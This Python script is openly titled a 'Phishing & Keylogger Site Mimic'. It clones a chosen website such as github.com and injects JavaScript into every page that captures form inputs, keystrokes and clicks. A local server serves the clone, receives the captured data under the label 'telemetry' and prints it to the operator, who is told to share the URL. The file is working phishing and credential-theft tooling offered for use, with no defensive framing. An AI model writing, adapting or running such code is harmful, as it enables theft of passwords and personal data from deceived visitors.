import os
import sys
import json
import time
import threading
import urllib.parse
import requests
import hashlib
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote

class SiteMimic:
    def __init__(self, target_url, output_dir="mimic_site"):
        # Normalize the URL to ensure it starts with a protocol
        if not target_url.startswith("http"):
            target_url = f"https://{target_url}"
            
        self.base_url = target_url
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        self.visited = set()
        self.keylog_js = self._generate_keylog_js()
        self.asset_cache = {} # url -> local_path

    def _generate_keylog_js(self):
        """Generates the JavaScript code to be injected into the page."""
        return """
        <script>
        (function() {
            const capturedData = {
                page: window.location.href,
                user: navigator.userAgent,
                referrer: document.referrer,
                clicks: [],
                inputs: {},
                keystrokes: []
            };

            // Capture form inputs
            document.addEventListener('input', function(e) {
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                    capturedData.inputs[e.target.name || e.target.id || e.target.type] = e.target.value;
                }
            });

            // Capture specific key events
            document.addEventListener('keydown', function(e) {
                if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
                    capturedData.keystrokes.push({
                        key: e.key,
                        code: e.code,
                        target: e.target.tagName,
                        timestamp: Date.now()
                    });
                }
            });

            // Capture clicks on buttons/links
            document.addEventListener('click', function(e) {
                if (e.target.tagName === 'BUTTON' || e.target.tagName === 'A') {
                    capturedData.clicks.push({
                        text: e.target.innerText || e.target.textContent,
                        href: e.target.href,
                        timestamp: Date.now()
                    });
                }
            });

            // Send data back to the local server when the page is about to unload or at intervals
            function sendData() {
                const data = JSON.stringify(capturedData);
                // Use fetch with 'no-cors' mode to avoid preflight issues, 
                // but since we are serving from the same origin (our local server), 
                // standard fetch works better for JSON parsing on the server side.
                fetch('/api/telemetry', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: data
                }).catch(err => console.error('Telemetry send failed', err));
            }

            // Periodic reporting
            setInterval(sendData, 5000);
            
            // Report on page hide/unload
            window.addEventListener('beforeunload', sendData);
            
            // Immediate report if a form is submitted
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                form.addEventListener('submit', sendData);
            });
        })();
        </script>
        """

    def _resolve_url(self, url):
        return urllib.parse.urljoin(self.base_url, url)

    def _get_safe_asset_path(self, url):
        """
        Generates a safe, short, unique filename for an asset URL.
        Uses the basename of the URL + a short MD5 hash of the full URL.
        """
        if not url:
            return None
            
        parsed = urlparse(url)
        # Get the last part of the path (e.g., 'script.js' from '/js/script.js')
        basename = os.path.basename(parsed.path)
        
        # If basename is empty or too generic, use a generic name
        if not basename or basename in [os.sep, '/', '']:
            basename = "asset"
            
        # Ensure basename has an extension if possible, otherwise default to .bin
        if '.' not in basename:
            basename += ".bin"
            
        # Create a short hash of the full URL to ensure uniqueness
        url_hash = hashlib.md5(url.encode('utf-8')).hexdigest()[:8]
        
        # Combine basename and hash: script.js.1a2b3c4d
        safe_name = f"{basename}.{url_hash}"
        
        # Limit length just in case
        if len(safe_name) > 100:
            # Truncate basename if necessary
            ext = os.path.splitext(basename)[1]
            base = os.path.splitext(basename)[0]
            max_base_len = 100 - len(url_hash) - 1 - len(ext)
            safe_name = f"{base[:max_base_len]}.{ext}.{url_hash}"
            
        return self.output_dir / "static" / safe_name

    def _download_asset(self, url):
        """
        Downloads an asset and returns the relative path from the mimic_site root.
        Returns None if failed.
        """
        if url in self.asset_cache:
            return self.asset_cache[url]
            
        safe_path = self._get_safe_asset_path(url)
        
        if not safe_path:
            return None

        try:
            if url.startswith(('http://', 'https://')):
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    safe_path.parent.mkdir(parents=True, exist_ok=True)
                    safe_path.write_bytes(response.content)
                    # Store relative path from output_dir
                    relative_path = safe_path.relative_to(self.output_dir)
                    self.asset_cache[url] = str(relative_path)
                    return str(relative_path)
            return None
        except Exception as e:
            print(f"Failed to download asset {url}: {e}")
            return None

    def _rewrite_asset_url(self, url):
        """
        Returns the local relative path for the asset, downloading it if necessary.
        """
        if not url or url.startswith('data:') or url.startswith('#') or url.startswith('mailto:'):
            return url
            
        # Resolve relative URLs to absolute
        absolute_url = self._resolve_url(url)
        
        # Only process external HTTP(S) resources
        if not absolute_url.startswith(('http://', 'https://')):
            return url

        local_path = self._download_asset(absolute_url)
        if local_path:
            return local_path
        else:
            # If download failed, return the original URL (best effort)
            return url

    def fetch_site(self, max_depth=3):
        print(f"Fetching {self.base_url}...")
        self._process_page(self.base_url, "", max_depth, 0)

    def _process_page(self, url, relative_path, max_depth, current_depth):
        if url in self.visited or current_depth > max_depth:
            return
        
        self.visited.add(url)
        
        # Determine save path
        if not relative_path:
            save_path = self.output_dir / "index.html"
        else:
            save_path = self.output_dir / relative_path
        
        save_path.parent.mkdir(parents=True, exist_ok=True)

        try:
            response = self.session.get(url, timeout=10)
            response.raise_for_status()
            html_content = response.text
        except Exception as e:
            print(f"Failed to fetch {url}: {e}")
            return

        # Basic cleanup and injection
        # 1. Inject our keylogger script before </head> or at the end of body
        if '</head>' in html_content:
            html_content = html_content.replace('</head>', f'{self.keylog_js}\n</head>', 1)
        else:
            html_content += self.keylog_js

        # 2. Rewrite asset URLs (CSS, JS, Images)
        import re
        asset_patterns = [
            r'src=["\']([^"\']+)["\']',
            r'href=["\']([^"\']+)["\']',
            r'url\(["\']?([^"\')]+)["\']?\)'
        ]
        
        for pattern in asset_patterns:
            matches = re.findall(pattern, html_content)
            for match in matches:
                # Skip internal anchors, data URIs, etc.
                if match.startswith(('data:', '#', 'mailto:', 'javascript:')):
                    continue
                
                # Resolve and rewrite
                new_url = self._rewrite_asset_url(match)
                if new_url != match:
                    html_content = html_content.replace(match, new_url)

        save_path.write_text(html_content, encoding='utf-8')
        print(f"Saved: {save_path}")

        # Recursively find internal links (simplified)
        if current_depth < max_depth:
            # Extract internal links
            internal_links = re.findall(r'href=["\']([^"\'#]+)["\']', html_content)
            for link in internal_links:
                if not link.startswith('http'):
                    full_link = self._resolve_url(link)
                    # Only follow links within the same domain
                    if urlparse(full_link).netloc == urlparse(self.base_url).netloc:
                        # Calculate relative path for recursive call
                        link_path = urlparse(full_link).path
                        # Ensure path doesn't start with /
                        link_path = link_path.lstrip('/')
                        self._process_page(full_link, link_path, max_depth, current_depth + 1)

class TelemetryHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/api/telemetry':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                print("\n" + "="*50)
                print(f"[TELEMETRY] Received from {self.client_address[0]}")
                print(f"Page: {data.get('page')}")
                print(f"User Agent: {data.get('user')}")
                if data.get('inputs'):
                    print("Captured Inputs:")
                    for k, v in data['inputs'].items():
                        print(f"  {k}: {v}")
                if data.get('keystrokes'):
                    print("Recent Keystrokes:")
                    for key in data['keystrokes'][-10:]:
                        print(f"  {key['key']} on {key['target']}")
                if data.get('clicks'):
                    print("Clicks:")
                    for click in data['clicks'][-5:]:
                        print(f"  {click['text']} -> {click['href']}")
                print("="*50 + "\n")
            except json.JSONDecodeError:
                print("Invalid JSON received")
        else:
            self.send_error(404, "Not Found")

    def do_GET(self):
        # Serve static files
        path = self.translate_path(self.path)
        if os.path.exists(path) and os.path.isfile(path):
            self.send_response(200)
            content_type = 'text/html'
            if path.endswith('.css'):
                content_type = 'text/css'
            elif path.endswith('.js'):
                content_type = 'application/javascript'
            elif path.endswith('.png'):
                content_type = 'image/png'
            elif path.endswith('.jpg') or path.endswith('.jpeg'):
                content_type = 'image/jpeg'
            elif path.endswith('.svg'):
                content_type = 'image/svg+xml'
            elif path.endswith('.webp'):
                content_type = 'image/webp'
            elif path.endswith('.woff'):
                content_type = 'font/woff'
            elif path.endswith('.woff2'):
                content_type = 'font/woff2'
            elif path.endswith('.ttf'):
                content_type = 'font/ttf'
            elif path.endswith('.ico'):
                content_type = 'image/x-icon'
                
            self.send_header('Content-Type', content_type)
            self.end_headers()
            with open(path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404, "File Not Found")

    def translate_path(self, path):
        # Map URL path to local file system path
        base_dir = "mimic_site"
        # Remove leading slash
        path = path.lstrip('/')
        if not path:
            path = "index.html"
        return os.path.join(base_dir, path)

    def log_message(self, format, *args):
        # Suppress default logging to keep terminal clean for telemetry
        pass

def run_server(port=8080):
    print(f"Starting Telemetry Server on http://0.0.0.0:{port}")
    server_address = ('', port)
    httpd = HTTPServer(server_address, TelemetryHandler)
    print("Server ready. Share the URL: http://<YOUR_IP>:" + str(port))
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server.")
        httpd.server_close()

def main():
    # Check if arguments were provided
    if len(sys.argv) > 1:
        target = sys.argv[1]
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    else:
        # Interactive mode
        print("Phishing & Keylogger Site Mimic")
        print("-" * 30)
        target = input("Enter target website (e.g., github.com or https://github.com): ").strip()
        
        if not target:
            print("No target provided. Exiting.")
            return
            
        port_input = input("Enter port (default 8080): ").strip()
        port = int(port_input) if port_input.isdigit() else 8080

    # Clean up previous run
    import shutil
    if os.path.exists("mimic_site"):
        print("Cleaning previous run...")
        shutil.rmtree("mimic_site")

    print("\nPhase 1: Building Website Clone...")
    mimicker = SiteMimic(target)
    mimicker.fetch_site(max_depth=2) # Limit depth to avoid massive crawls

    print("\nPhase 2: Starting Local Server...")
    run_server(port)

if __name__ == "__main__":
    main()
